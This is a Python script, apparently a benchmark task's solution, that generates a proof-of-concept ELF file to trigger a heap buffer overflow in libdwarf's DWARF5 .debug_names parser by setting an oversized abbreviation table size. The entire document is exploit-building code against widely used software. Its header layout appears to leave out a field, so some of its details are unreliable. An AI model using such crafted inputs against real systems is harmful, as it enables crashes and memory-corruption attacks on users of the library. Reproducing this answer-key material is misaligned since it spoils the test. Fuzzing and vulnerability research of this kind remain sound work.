import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in libdwarf's DWARF5 .debug_names parser.

        The vulnerability (oss-fuzz:383170474) exists because the parser trusts the
        `abbrev_table_size` from the .debug_names header without validating it against the
        actual section size. By providing a large `abbrev_table_size` in the header but
        a much smaller actual section, we cause the parser to read past the end of the
        allocated buffer when iterating through the (non-existent) abbreviation table.

        The PoC is a minimal 32-bit ELF file containing a crafted .debug_names section.
        """
        p32 = lambda n: struct.pack('<I', n)
        p16 = lambda n: struct.pack('<H', n)

        # 1. Create the malicious .debug_names section content.
        # This includes a header and a minimal body.
        
        # The body is constructed to be valid up to the point where the abbreviation
        # table is parsed. We use minimal counts (1) for simplicity.
        debug_names_body = b''
        debug_names_body += p32(0)      # buckets[0]
        debug_names_body += p32(0)      # hashes[0]
        debug_names_body += p32(0)      # offsets[0]
        debug_names_body += b'\x01'     # abbrev_codes[0] (ULEB128 for 1)
        debug_names_body += b'poc\x00'  # A minimal string table
        debug_names_body += b'\x00'     # A minimal abbreviation table (just a terminator)
        
        # The header contains the trigger: a large `abbrev_table_size`.
        debug_names_header = b''
        # DWARF5 header is 33 bytes. unit_length = total_size - 4.
        unit_length = (33 - 4) + len(debug_names_body)
        debug_names_header += p32(unit_length)
        debug_names_header += p16(5)        # version (DWARF5)
        debug_names_header += p16(0)        # padding
        debug_names_header += p32(1)        # comp_unit_count
        debug_names_header += p32(0)        # local_tu_count
        debug_names_header += p32(0)        # foreign_tu_count
        debug_names_header += p32(1)        # bucket_count
        debug_names_header += p32(1)        # name_count
        debug_names_header += p32(0xffff)   # abbrev_table_size (THE TRIGGER)
        debug_names_header += b'\x00'       # augmentation_string
        
        debug_names_content = debug_names_header + debug_names_body
        s_debug_names = len(debug_names_content)

        # 2. Create the section header string table (.shstrtab).
        shstrtab_content = b'\x00.debug_names\x00.shstrtab\x00'
        s_shstrtab = len(shstrtab_content)

        # 3. Define the ELF file layout.
        ELF_HEADER_SIZE = 52
        sections_data_offset = ELF_HEADER_SIZE
        sht_offset = sections_data_offset + s_debug_names + s_shstrtab

        # 4. Construct the 32-bit ELF header.
        elf_header = b''
        elf_header += b'\x7fELF\x01\x01\x01' + b'\x00' * 9  # e_ident (32-bit, LSB)
        elf_header += p16(1)    # e_type = ET_REL
        elf_header += p16(3)    # e_machine = EM_386
        elf_header += p32(1)    # e_version
        elf_header += p32(0)    # e_entry
        elf_header += p32(0)    # e_phoff
        elf_header += p32(sht_offset)
        elf_header += p32(0)    # e_flags
        elf_header += p16(ELF_HEADER_SIZE)
        elf_header += p16(0)    # e_phentsize
        elf_header += p16(0)    # e_phnum
        elf_header += p16(40)   # e_shentsize (size of one SHT entry)
        elf_header += p16(3)    # e_shnum (NULL, .debug_names, .shstrtab)
        elf_header += p16(2)    # e_shstrndx (index of .shstrtab)

        # 5. Construct the Section Header Table (SHT).
        sht = b''
        # SHT Entry 0: NULL section (required)
        sht += b'\x00' * 40
        # SHT Entry 1: .debug_names
        sht += p32(1)   # sh_name (offset in .shstrtab)
        sht += p32(1)   # sh_type = SHT_PROGBITS
        sht += p32(0)   # sh_flags
        sht += p32(0)   # sh_addr
        sht += p32(sections_data_offset)
        sht += p32(s_debug_names)
        sht += p32(0)   # sh_link
        sht += p32(0)   # sh_info
        sht += p32(1)   # sh_addralign
        sht += p32(0)   # sh_entsize
        # SHT Entry 2: .shstrtab
        sh_name_shstrtab = shstrtab_content.find(b'.shstrtab\x00')
        sh_offset_shstrtab = sections_data_offset + s_debug_names
        sht += p32(sh_name_shstrtab)
        sht += p32(3)   # sh_type = SHT_STRTAB
        sht += p32(0)   # sh_flags
        sht += p32(0)   # sh_addr
        sht += p32(sh_offset_shstrtab)
        sht += p32(s_shstrtab)
        sht += p32(0)   # sh_link
        sht += p32(0)   # sh_info
        sht += p32(1)   # sh_addralign
        sht += p32(0)   # sh_entsize

        # 6. Assemble the final PoC file.
        poc = elf_header + debug_names_content + shstrtab_content + sht
        return poc
